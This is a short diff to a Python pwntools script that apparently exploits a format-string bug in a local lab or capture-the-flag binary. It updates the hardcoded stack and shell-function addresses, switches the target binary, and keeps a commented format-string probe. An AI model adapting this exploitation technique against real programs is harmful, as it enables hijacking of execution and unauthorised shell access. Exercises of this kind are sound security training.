@@ -2,8 +2,8 @@
 
 from pwn import *
 
-addr = 0xffffcf0c
-shellAddr = 0x0804854b
+addr = 0xffffce9c
+shellAddr = 0x080484cb
 
 output = ""
 
@@ -15,13 +15,13 @@ print output
 
 #output = p32(addr) + "...%5$x"
 
-p = process("./format_long")
+p = process("../format")
 
 #gdb.attach(p)
 
 p.sendline(output)
 
-p.recvuntil("a", 1000000000)
+#p.recvuntil("a", 1000000000)
 
 #print "Done:"
 
